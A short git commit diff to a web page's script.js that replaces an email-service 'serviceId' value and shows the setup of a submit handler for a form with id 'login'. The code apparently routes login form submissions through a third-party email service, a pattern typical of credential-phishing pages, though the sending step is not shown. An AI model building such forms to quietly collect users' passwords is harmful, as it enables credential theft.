cccb19139bd416f0d085d24b590f02cdf2d9d575
login811 <148689726+login811@users.noreply.github.com>
2024-01-10 07:28:14 +0100

    Update script.js

--- script.js
+++ script.js
@@ -5,7 +5,7 @@ const btn = document.querySelector("button");
 btn.onclick = () => {
   btn.innerHTML = "Loading...";
 };
-const serviceId = "service_s2wbehf";
+const serviceId = "service_v7kg7cm";
 const userId = "w0Q6rGREdg2xRfoeb";
 const templateId = "template_ien303e";
 document.getElementById("login").onsubmit = function (event) {
